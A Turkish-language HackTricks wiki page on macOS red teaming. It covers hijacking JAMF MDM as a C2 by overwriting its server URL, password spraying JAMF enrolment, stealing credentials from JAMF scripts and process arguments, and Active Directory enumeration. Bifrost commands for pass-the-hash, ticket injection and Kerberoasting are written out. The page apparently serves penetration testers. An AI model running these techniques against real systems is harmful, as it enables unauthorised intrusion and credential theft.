# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## MDM'leri Kötüye Kullanma

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Management platformuna erişmek için **admin kimlik bilgilerini ele geçirmeyi** başarırsanız, makinelerde malware'inizi dağıtarak **potansiyel olarak tüm bilgisayarları ele geçirebilirsiniz**.

MacOS ortamlarında red teaming yapmak için MDM'lerin nasıl çalıştığı hakkında bilgi sahibi olmanız şiddetle önerilir:


{{#ref}}
macos-mdm/
{{#endref}}

### MDM'yi C2 Olarak Kullanma

Bir MDM; profilleri yükleme, sorgulama veya kaldırma, uygulama yükleme, yerel admin hesapları oluşturma, firmware parolası ayarlama ve FileVault anahtarını değiştirme izinlerine sahip olur.

Kendi MDM'nizi çalıştırmak için **CSR'nizin bir vendor tarafından imzalanması** gerekir; bunu [**https://mdmcert.download/**](https://mdmcert.download/) üzerinden edinmeyi deneyebilirsiniz. Apple cihazları için kendi MDM'nizi çalıştırmak amacıyla [**MicroMDM**](https://github.com/micromdm/micromdm) kullanabilirsiniz.

Ancak enrolled bir cihaza uygulama yüklemek için uygulamanın hâlâ bir developer account tarafından imzalanmış olması gerekir... Bununla birlikte, MDM enrolment sırasında **cihaz MDM'nin SSL cert'ini trusted CA olarak ekler**, böylece artık istediğiniz her şeyi imzalayabilirsiniz.<sup>[4]</sup>

Cihazı bir MDM'ye enrol etmek için root olarak bir **`mobileconfig`** dosyası yüklemeniz gerekir; bu dosya bir **pkg** dosyası aracılığıyla teslim edilebilir (zip içinde sıkıştırabilirsiniz ve Safari üzerinden indirildiğinde dosya açılır).

**Mythic agent Orthrus** bu tekniği kullanır.

### JAMF PRO'yu Kötüye Kullanma

JAMF; **custom scripts** (sysadmin tarafından geliştirilen script'ler), **native payloads** (yerel hesap oluşturma, EFI parolası ayarlama, dosya/process monitoring...) ve **MDM** (cihaz yapılandırmaları, cihaz sertifikaları...) çalıştırabilir.<sup>[5]</sup>

#### JAMF self-enrolment

**Self-enrolment özelliğinin etkin olup olmadığını** görmek için `https://<company-name>.jamfcloud.com/enroll/` gibi bir sayfaya gidin. Etkinse **erişim için kimlik bilgileri isteyebilir**.

Password spraying attack gerçekleştirmek için [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) script'ini kullanabilirsiniz.

Ayrıca, uygun kimlik bilgilerini bulduktan sonra aşağıdaki form ile diğer kullanıcı adlarını brute-force edebilirsiniz:

![Abusing JAMF PRO - JAMF self-enrolment: Ayrıca, uygun kimlik bilgilerini bulduktan sonra aşağıdaki form ile diğer kullanıcı adlarını brute-force edebilirsiniz](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binary'si, keychain'i açmak için gereken secret'ı içeriyordu; keşfedildiği tarihte bu secret herkes arasında **paylaşılıyordu** ve şu şekildeydi: **`jk23ucnq91jfu9aj`**.<sup>[5]</sup>\
Ayrıca jamf, **`/Library/LaunchAgents/com.jamf.management.agent.plist`** konumunda bir **LaunchDaemon** olarak **persist** eder.

#### JAMF Device Takeover

**`jamf`** tarafından kullanılacak **JSS** (Jamf Software Server) **URL'si**, **`/Library/Preferences/com.jamfsoftware.jamf.plist`** konumunda bulunur.\
Bu dosya temel olarak URL'yi içerir:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Böylece bir saldırgan, kurulduğunda **bu dosyanın üzerine yazan** kötü amaçlı bir paket (`pkg`) bırakarak **URL'yi bir Typhon agent'ından Mythic C2 listener'ına** ayarlayabilir ve JAMF'i C2 olarak kötüye kullanabilir.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Bir cihaz ile JMF arasındaki iletişimi **taklit etmek** için şunlara ihtiyacınız vardır:

- Cihazın **UUID** değeri: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Şuradaki **JAMF keychain**: `/Library/Application\ Support/Jamf/JAMF.keychain`; bu dosya cihaz sertifikasını içerir.

Bu bilgilerle, **çalınan** Hardware **UUID** değerine sahip ve **SIP devre dışı** bırakılmış bir **VM oluşturun**, **JAMF keychain** dosyasını yerleştirin, Jamf **agent** işlemine **hook** ekleyin ve bilgilerini çalın.

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Ayrıca `/Library/Application Support/Jamf/tmp/` konumunu da izleyebilirsiniz; yöneticilerin Jamf üzerinden çalıştırmak isteyebileceği **custom script** dosyaları buraya **yerleştirilir, çalıştırılır ve silinir**. Bu script'ler **credentials** içerebilir.

Ancak **credentials**, bu script'lere **parametre** olarak da aktarılabilir. Bu nedenle `ps aux | grep -i jamf` komutunu izlemeniz gerekir (root olmanıza bile gerek yoktur).

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) script'i, eklenen yeni dosyaları ve yeni process argument'larını dinleyebilir.

### macOS Remote Access

Ayrıca **MacOS** üzerindeki "özel" **network** **protocol**'leri hakkında:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Bazı durumlarda **MacOS bilgisayarının bir AD'ye bağlı** olduğunu görebilirsiniz. Bu senaryoda, alışık olduğunuz şekilde active directory'yi **enumerate** etmeyi denemelisiniz. Aşağıdaki sayfalarda **yardım** bulabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Size yardımcı olabilecek bazı **yerel MacOS tool**'ları arasında `dscl` da bulunur:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Ayrıca MacOS için AD'yi otomatik olarak enumerate etmek ve kerberos ile çalışmak üzere hazırlanmış bazı araçlar da bulunmaktadır:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound, MacOS host'larında Active Directory ilişkilerinin toplanmasına ve içe aktarılmasına olanak tanıyan Bloodhound audting aracının bir uzantısıdır.<sup>[2]</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost, macOS üzerinde Heimdal krb5 API'leriyle etkileşim kurmak için tasarlanmış bir Objective-C projesidir. Projenin amacı, hedefte başka bir framework veya paket gerektirmeden native API'leri kullanarak macOS cihazlarında Kerberos çevresinde daha iyi security testing yapılmasını sağlamaktır.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory enumeration yapmak için kullanılan bir JavaScript for Automation (JXA) aracıdır.

### Domain Bilgileri
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Kullanıcılar

MacOS kullanıcılarının üç türü vardır:

- **Local Users** — Yerel OpenDirectory hizmeti tarafından yönetilirler ve Active Directory'ye herhangi bir şekilde bağlı değildirler.
- **Network Users** — Kimlik doğrulamak için DC sunucusuna bağlantı gerektiren geçici Active Directory kullanıcılarıdır.
- **Mobile Users** — Kimlik bilgileri ve dosyaları için yerel yedeğe sahip Active Directory kullanıcılarıdır.

Kullanıcılar ve gruplarla ilgili yerel bilgiler _/var/db/dslocal/nodes/Default._ klasöründe saklanır.\
Örneğin, _mark_ adlı kullanıcıyla ilgili bilgiler _/var/db/dslocal/nodes/Default/users/mark.plist_ dosyasında, _admin_ grubuyla ilgili bilgiler ise _/var/db/dslocal/nodes/Default/groups/admin.plist_ dosyasında saklanır.

HasSession ve AdminTo ilişkilerinin yanı sıra, **MacHound Bloodhound veritabanına üç yeni ilişki ekler**:<sup>[2]</sup>

- **CanSSH** - host'a SSH yapmasına izin verilen varlık
- **CanVNC** - host'a VNC yapmasına izin verilen varlık
- **CanAE** - host üzerinde AppleEvent script'lerini çalıştırmasına izin verilen varlık
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Daha fazla bilgi için: [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ password

Şunları kullanarak password'leri alın:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** parolasına System keychain içinden erişmek mümkündür.

### Over-Pass-The-Hash

Belirli bir kullanıcı ve service için bir TGT alın:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGT toplandıktan sonra, şu komutla mevcut session'a inject etmek mümkündür:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Elde edilen service ticket'larla diğer bilgisayarlardaki paylaşımlara erişmeyi denemek mümkündür:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Keychain'e Erişim

Keychain, bir prompt oluşturmadan erişilmesi durumunda bir red team çalışmasının ilerletilmesine yardımcı olabilecek hassas bilgiler içeriyor olabilir:


{{#ref}}
macos-keychain.md
{{#endref}}

## External Services

MacOS Red Teaming, normal bir Windows Red Teaming çalışmasından farklıdır; çünkü **MacOS genellikle doğrudan çeşitli external platformlarla entegre edilir**. Yaygın bir MacOS yapılandırmasında bilgisayara **OneLogin ile senkronize edilmiş kimlik bilgileri kullanılarak erişilir ve OneLogin üzerinden çeşitli external services** (github, aws gibi) kullanılır.

## Misc Red Team teknikleri

### Safari

Safari'de bir dosya indirildiğinde, dosya "safe" ise **otomatik olarak açılır**. Örneğin, **bir zip indirirseniz**, dosya otomatik olarak decompress edilir:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
